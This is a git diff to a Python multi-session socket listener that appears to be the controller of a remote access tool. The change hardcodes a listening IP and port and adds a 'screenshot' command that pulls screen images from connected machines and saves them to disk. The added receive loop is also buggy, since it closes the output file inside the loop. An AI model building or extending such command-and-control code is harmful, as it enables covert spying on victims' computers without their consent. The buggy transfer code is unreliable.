@@ -13,6 +13,7 @@ import threading
 import queue
 import sys , os , time
 from tabulate import *
+import tqdm
 #from tool import help_menu
 '''setting the variabeles'''
 NUMBER_OF_THREAD = 2
@@ -21,8 +22,9 @@ queue = queue.Queue()
 all_connection = []
 address_connection = []
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host = socket.gethostbyname(socket.gethostname())
+host = "192.168.1.110"
 port = 5050
+SEPARATOR = "<SEPARATOR>"
 ''' setting a socket creating'''
 def connection_info():
 	try:
@@ -74,6 +76,20 @@ def intarface():
 			session_list()
 		elif op_listen == "connect":
 			session_connect()
+		elif op_listen[0:] == "screenshot":
+			img = s.recv(1024).decode("utf-8")
+			img_name , img_size = img.split(SEPARATOR)
+			img_name = os.path.basename(img_name)
+			img_size = int(img_size)
+			progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {y}Receiving {img_name}", unit="B", unit_scale=True, unit_divisor=1024)
+			with open(img_name,"wb") as i :
+				while True:
+					bytes_reads = s.recv(1024)
+					if not bytes_reads:
+						break
+					i.write(bytes_reads)
+					i.close()
+					progress.update(len(bytes_reads))
 		elif op_listen == "help":
 			help_menu()
 		else:
